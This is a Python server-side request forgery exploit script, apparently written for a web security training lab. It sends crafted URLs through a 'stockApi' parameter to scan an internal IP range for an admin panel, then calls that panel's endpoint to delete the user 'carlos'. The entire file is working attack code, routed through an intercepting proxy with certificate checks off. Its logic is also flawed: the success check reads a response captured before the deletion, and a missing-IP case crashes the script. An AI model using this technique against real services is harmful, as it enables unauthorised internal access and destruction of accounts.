import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy= {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def enumerate_ip(url):
    for i in range(190,256):
        parameter = '/product/stock'
        parameter_payload= 'http://192.168.0.%s:8080/admin' % i
        print(parameter_payload)
        params = {'stockApi': parameter_payload}
        r = requests.post(url + parameter, data=params, proxies=proxy, verify=False)
        if r.status_code == 200:
            admin_ip= '192.168.0.%s:8080' %i
            print('[+] admin ip found %s' % admin_ip)
            break
    if admin_ip == '':
        print('[-] Couldnt find Ip address')
    return admin_ip

def check_carlos(url, admin_ip):
    parameter = '/product/stock'
    parameter_payload = 'http://%s/admin' % admin_ip
    params = {'stockApi': parameter_payload}
    print(parameter_payload)
    r = requests.post(url + parameter, data=params, proxies=proxy, verify=False)
    rcheck = r.text
    return rcheck

def delete_carlos(url):
    print('Launching')
    admin_ip = enumerate_ip(url)
    rcheck = check_carlos(url, admin_ip)
    parameter = '/product/stock'
    parameter_payload = 'http://%s/admin/delete?username=carlos' % admin_ip
    params = {'stockApi': parameter_payload}
    requests.post(url + parameter, data=params, proxies=proxy, verify=False)
    print('yo')
    if 'User deleted successfully!' in rcheck:
        print('[+] Successfully deleted')


def main():
    if len(sys.argv) !=2:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print("[-] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    delete_carlos(url)
    print('[+] Looking for admin ip address')

if __name__ == "__main__":
    main()